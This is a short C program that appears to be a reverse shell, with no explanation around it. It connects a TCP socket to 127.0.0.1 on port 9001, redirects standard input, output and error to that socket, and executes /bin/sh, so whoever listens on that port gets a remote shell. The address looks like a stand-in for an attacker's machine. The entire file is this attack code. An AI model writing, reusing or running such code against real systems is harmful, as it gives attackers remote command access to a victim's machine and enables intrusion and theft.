#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void){
 int sfd;
 int port = 9001;
 struct sockaddr_in srv_addr;
 char *const params[] = {"/bin/sh &", NULL};
 char *const environ[] = {NULL};

 sfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 srv_addr.sin_family = AF_INET;
 srv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
 srv_addr.sin_port = htons(port);
 connect(sfd, (struct sockaddr *) &srv_addr, 16);

 dup2(sfd,0);
 dup2(0,1);
 dup2(0,2);
 execve("/bin/sh", params, environ);
}
